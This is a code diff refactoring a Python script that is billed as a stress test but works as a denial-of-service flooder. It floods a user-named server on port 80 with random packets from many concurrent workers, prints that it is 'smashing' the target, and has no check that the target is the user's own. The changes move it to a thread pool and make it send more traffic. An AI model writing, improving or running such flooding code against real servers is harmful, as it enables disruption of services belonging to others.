@@ -5,6 +5,7 @@ import sys
 import threading
 import re
 import signal
+from concurrent.futures import ThreadPoolExecutor
 
 # Function to handle "Ctrl+C" interruption and exit gracefully
 def signal_handler(sig, frame):
@@ -53,24 +54,11 @@ def generate_random_string(length):
 
 def send_packet(server, packet_size):
     try:
-        # Check if the provided server is an IP address or a URL
-        if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", server):
-            server_ip = server
-        else:
-            server_ip = socket.gethostbyname(server)
-
-        # Create a socket connection to the server
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((server_ip, 80))
-
-        # Generate a random packet of the specified size
-        packet = generate_random_string(packet_size).encode()
-
-        # Send the packet to the server
-        client_socket.send(packet)
-
-        # Close the socket connection
-        client_socket.close()
+        server_ip = server if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", server) else socket.gethostbyname(server)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect((server_ip, 80))
+            packet = generate_random_string(packet_size).encode()
+            client_socket.send(packet)
         print(f"Sent a {packet_size}-byte packet to {server}")
     except Exception as e:
         print(f"Error: {e}")
@@ -112,9 +100,9 @@ def stress_test():
 
     print(f"Currently smashing {server} with {num_threads} threads and {num_packets} packets...")
 
-    for _ in range(num_threads):
-        thread = threading.Thread(target=send_packet, args=(server, packet_size))
-        thread.start()
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        for _ in range(num_packets):
+            executor.submit(send_packet, server, packet_size)
 
 if __name__ == "__main__":
     stress_test()
